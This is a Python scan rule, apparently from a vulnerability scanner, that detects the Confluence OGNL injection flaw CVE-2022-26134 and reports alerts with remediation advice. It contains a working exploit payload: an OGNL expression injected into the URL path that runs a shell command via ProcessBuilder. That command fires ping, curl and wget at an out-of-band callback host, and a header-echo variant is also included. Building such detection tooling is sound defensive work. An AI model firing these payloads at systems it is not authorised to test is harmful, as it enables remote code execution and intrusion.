# Filename: VulnerabilityChecks/ConfluenceOGNLInjectionCVE202226134ScanRule.py

import asyncio
import logging
import random
import string
import uuid
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple, TYPE_CHECKING, Set

import aiohttp

if TYPE_CHECKING:
    from asyncio import Queue # For type hinting

@dataclass
class ConfluenceOGNLAlert:
    cwe_id: int = 94
    wasc_id: int = 20
    name: str = "Confluence Unauthenticated OGNL Injection RCE (CVE-2022-26134)"
    description: str = (
        "Confluence Server and Data Center are vulnerable to an unauthenticated OGNL injection "
        "(CVE-2022-26134). An attacker can exploit this by sending a specially crafted URI "
        "to execute arbitrary code on the Confluence instance."
    )
    uri: str = ""
    attack_details: Dict[str, Any] = field(default_factory=dict)
    evidence: str = ""
    other_info: str = ""
    solution: str = (
        "Upgrade Confluence Server and Data Center to a patched version (e.g., 7.4.17, 7.13.7, 7.14.3, "
        "7.15.2, 7.16.4, 7.17.4, 7.18.1 or later). Refer to Atlassian's security advisory for the most "
        "up-to-date information. Restrict access to Confluence instances from untrusted networks."
    )
    reference: str = (
        "CVE-2022-26134\n"
        "Atlassian Security Advisory: https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html\n"
        "CSO Online: https://www.csoonline.com/article/570606/critical-confluence-vulnerability-allows-remote-code-execution.html"
    )
    risk: int = 4
    confidence: int = 2
    # Class level constants for confidence
    CONFIDENCE_HIGH: int = 3
    CONFIDENCE_MEDIUM: int = 2

    cve_id: str = "CVE-2022-26134"
    oast_interaction_id: Optional[str] = None
    alert_tags: Dict[str, str] = field(default_factory=lambda: {
        "CVE": "CVE-2022-26134",
        "OWASP_2021_A03": "Injection",
        "OWASP_2021_A06": "Vulnerable and Outdated Components",
        "WSTG_V42_INPV_11": "Code Injection",
        "OAST": "Recommended"
    })

    def as_dict(self) -> Dict[str, Any]:
        tags = self.alert_tags.copy()
        if self.oast_interaction_id:
            tags["OAST_Interaction"] = "Attempted"
        
        return {
            "vulnerability_type": "Confluence_OGNL_RCE_CVE-2022-26134",
            "type": self.name,
            "detail": self.description,
            "payload_used": self.attack_details.get("ognl_payload_snippet", "N/A"),
            "injection_point_info": f"URI Path Injection at {self.attack_details.get('endpoint_attacked', 'N/A')}",
            "url_tested": self.uri,
            "severity": {1: "Info", 2: "Low", 3: "Medium", 4: "High"}.get(self.risk, "Unknown"),
            "confidence": {1: "Low", 2: "Medium", 3: "High"}.get(self.confidence, "Unknown"),
            "evidence": self.evidence,
            "solution": self.solution,
            "reference": self.reference,
            "cwe_id": self.cwe_id,
            "wasc_id": self.wasc_id,
            "alert_tags": tags,
            "other_info": self.other_info
        }

OGNL_ECHO_MARKER_PREFIX = "CONFOGNLRCE"

class ConfluenceOGNLInjectionCVE202226134ScanRule:
    tech_required: Set[str] = {"Confluence"} # Specific to Confluence
    def __init__(self,
                 parent_logger: Optional[logging.Logger] = None,
                 oast_base_url: Optional[str] = None,
                 http_timeout: float = 15.0,
                 active_scan_async_q: Optional['Queue'] = None # Added parameter
                 ):
        self.logger = parent_logger or logging.getLogger(__name__)
        self.oast_base_url = self._normalize_oast_url(oast_base_url) if oast_base_url else None
        self.http_timeout = http_timeout
        self.active_scan_async_q = active_scan_async_q # Store the queue
        
        if not self.oast_base_url:
            self.logger.info("Confluence CVE-2022-26134 Scan: OAST base URL not configured. RCE confirmation will rely on echo/errors.")

    def _normalize_oast_url(self, url: str) -> str:
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc if parsed.netloc else parsed.path.split('/')[0]

    def _get_ognl_payload_oast(self, unique_id: str) -> str:
        if not self.oast_base_url:
            return self._get_ognl_payload_echo(unique_id)

        oast_target_host = f"{unique_id}.{self.oast_base_url}"
        os_command = f"ping -c 1 {oast_target_host} || curl -m 3 -s http://{oast_target_host}/confluence_rce || wget -T 3 -qO- http://{oast_target_host}/confluence_rce_wget"
        os_command_escaped = os_command.replace("'", "\\'")

        ognl_payload = (
            f"Class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('nashorn')"
            f".eval('new java.lang.ProcessBuilder(\"sh\", \"-c\", \"{os_command_escaped}\").start()')"
        )
        return ognl_payload

    def _get_ognl_payload_echo(self, unique_id: str) -> str:
        echo_string = f"{OGNL_ECHO_MARKER_PREFIX}{unique_id}"
        ognl_payload = (
            f"#response.addHeader('X-Confluence-Echo-Test','{echo_string}')"
        )
        return ognl_payload

    async def _send_confluence_request(
        self,
        session: aiohttp.ClientSession,
        target_url_with_payload: str,
        original_headers: Optional[Dict[str, str]] = None
    ) -> Tuple[Optional[str], int, Optional[Dict[str,str]]]:
        
        headers_to_send = (original_headers or {}).copy()
        if "User-Agent" not in headers_to_send:
             headers_to_send["User-Agent"] = random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            ])
        
        self.logger.debug(f"Confluence CVE-2022-26134 Scan: Sending GET to {target_url_with_payload}")
        
        text_content: Optional[str] = None
        status_code: int = -1
        response_headers_dict: Optional[Dict[str,str]] = None

        try:
            timeout = aiohttp.ClientTimeout(total=self.http_timeout)
            async with session.get(
                target_url_with_payload, headers=headers_to_send,
                timeout=timeout, allow_redirects=False, ssl=False
            ) as resp:
                text_content = await resp.text(errors='replace')
                status_code = resp.status
                response_headers_dict = dict(resp.headers)
                self.logger.debug(f"Confluence CVE-2022-26134: Response from {target_url_with_payload}: Status {status_code}")
        except Exception as e:
            self.logger.warning(f"Confluence CVE-2022-26134: Request to {target_url_with_payload} failed: {type(e).__name__} - {e}")
        
        return text_content, status_code, response_headers_dict

    async def _queue_alert(self, alert_instance: ConfluenceOGNLAlert):
        if self.active_scan_async_q:
            try:
                await self.active_scan_async_q.put({"type": "active_scan_alert", "alert": alert_instance.as_dict()})
            except Exception as e_queue:
                self.logger.error(f"Failed to put Confluence OGNL alert onto async queue: {e_queue}")
        else:
            self.logger.warning("active_scan_async_q not available in Confluence OGNL rule, cannot queue alert.")

    async def scan(
        self,
        confluence_base_url: str,
        original_headers: Dict[str, str],
        aiohttp_session: aiohttp.ClientSession,
        # The following are part of a more generic signature but less used by this specific rule
        original_cookies: Optional[Dict[str, str]] = None,
        page_specific_technologies: Optional[List[str]] = None,
        injection_details: Optional[Dict[str, Any]] = None,
        original_page_content_for_baseline_errors: Optional[str] = None
    ) -> None: # Changed return type to None
        
        if not self.active_scan_async_q:
            self.logger.warning("Confluence CVE-2022-26134 scan skipped: active_scan_async_q not configured.")
            return

        if not confluence_base_url.endswith('/'):
            confluence_base_url += '/'
        
        self.logger.info(f"Starting Confluence OGNL RCE (CVE-2022-26134) scan for: {confluence_base_url}")

        unique_oast_id = str(uuid.uuid4())
        payloads_to_try: List[Tuple[str, str, str]] = []
        alerts_generated_count = 0
        high_confidence_alert_found = False

        if self.oast_base_url:
            payloads_to_try.append((self._get_ognl_payload_oast(unique_oast_id), "OAST", unique_oast_id))
        
        echo_unique_id = str(uuid.uuid4())
        payloads_to_try.append((self._get_ognl_payload_echo(echo_unique_id), "ECHO", echo_unique_id))

        for ognl_payload_str, payload_type, current_unique_id in payloads_to_try:
            if high_confidence_alert_found: break

            encoded_ognl_payload = urllib.parse.quote_plus(ognl_payload_str)
            attack_path_segment = f"${{{encoded_ognl_payload}}}/"
            
            test_base_paths = ["", "login.action", "dashboard.action"] 

            for base_path_segment in test_base_paths:
                if high_confidence_alert_found: break

                if base_path_segment:
                    path_with_payload = f"{base_path_segment.lstrip('/')}/${{{encoded_ognl_payload}}}/"
                else:
                    path_with_payload = f"${{{encoded_ognl_payload}}}/"

                target_attack_url = urllib.parse.urljoin(confluence_base_url, path_with_payload)
                
                self.logger.debug(f"Confluence CVE-2022-26134: Testing URL: {target_attack_url} with payload type: {payload_type}")

                resp_text, status, resp_headers = await self._send_confluence_request(
                    aiohttp_session, target_attack_url, original_headers
                )

                attack_details_for_alert = {
                    "endpoint_attacked": target_attack_url,
                    "ognl_payload_snippet": ognl_payload_str[:100] + "...",
                    "payload_type": payload_type
                }
                alert_to_raise: Optional[ConfluenceOGNLAlert] = None

                if payload_type == "OAST":
                    if status != -1 :
                        self.logger.info(f"Confluence CVE-2022-26134: OAST payload sent to {target_attack_url}. Check OAST server for ID {current_unique_id}.")
                        alert_to_raise = ConfluenceOGNLAlert(
                            uri=confluence_base_url,
                            attack_details=attack_details_for_alert,
                            evidence=f"OAST interaction attempt made. Check OAST server for ID: {current_unique_id}. Target URL: {target_attack_url}",
                            other_info=f"OAST Interaction ID: {current_unique_id}. OGNL Payload (raw): {ognl_payload_str}",
                            confidence=ConfluenceOGNLAlert.CONFIDENCE_MEDIUM,
                            oast_interaction_id=current_unique_id
                        )
                
                elif payload_type == "ECHO":
                    echo_marker_to_find = f"{OGNL_ECHO_MARKER_PREFIX}{current_unique_id}"
                    if resp_headers and resp_headers.get('X-Confluence-Echo-Test', '') == echo_marker_to_find:
                        self.logger.info(f"Confluence CVE-2022-26134: Echo marker '{echo_marker_to_find}' FOUND in X-Confluence-Echo-Test header from {target_attack_url}.")
                        alert_to_raise = ConfluenceOGNLAlert(
                            uri=confluence_base_url,
                            attack_details=attack_details_for_alert,
                            evidence=f"Echo marker '{echo_marker_to_find}' found in 'X-Confluence-Echo-Test' response header.",
                            other_info=f"Echo Test ID: {current_unique_id}. OGNL Payload (raw): {ognl_payload_str}",
                            confidence=ConfluenceOGNLAlert.CONFIDENCE_HIGH
                        )
                    elif resp_text and echo_marker_to_find in resp_text:
                        self.logger.info(f"Confluence CVE-2022-26134: Echo marker '{echo_marker_to_find}' FOUND in response body from {target_attack_url}.")
                        alert_to_raise = ConfluenceOGNLAlert(
                            uri=confluence_base_url,
                            attack_details=attack_details_for_alert,
                            evidence=f"Echo marker '{echo_marker_to_find}' found in response body. Snippet: {resp_text[:300]}",
                            other_info=f"Echo Test ID: {current_unique_id}. OGNL Payload (raw): {ognl_payload_str}",
                            confidence=ConfluenceOGNLAlert.CONFIDENCE_HIGH
                        )
                
                if alert_to_raise:
                    await self._queue_alert(alert_to_raise)
                    alerts_generated_count +=1
                    if alert_to_raise.confidence == ConfluenceOGNLAlert.CONFIDENCE_HIGH:
                        high_confidence_alert_found = True
                        # Break from inner loop (base_path_segment)
                        break 
            
            # If high confidence found, break from outer loop (payloads_to_try)
            if high_confidence_alert_found:
                break


        if alerts_generated_count > 0:
            self.logger.info(f"Confluence OGNL RCE (CVE-2022-26134) scan for {confluence_base_url} completed. Found {alerts_generated_count} potential alerts.")
        else:
            self.logger.info(f"Confluence OGNL RCE (CVE-2022-26134) scan for {confluence_base_url} completed. No alerts generated.")
        return